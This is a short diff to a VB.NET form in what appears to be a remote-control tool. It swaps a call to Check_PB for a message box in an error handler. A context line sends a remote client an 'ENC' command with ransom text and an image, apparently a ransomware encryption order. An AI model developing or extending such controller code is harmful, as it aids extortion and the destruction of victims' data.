@@ -420,7 +420,7 @@ Public Class Form1
                     S.Send(u, "ENC" + SPL + RANS_TEXT + SPL + RANS_IMG)
             End Select
         Catch ex As Exception
-            Check_PB(ex.Message)
+            MsgBox(ex.Message)
         End Try
 
     End Sub
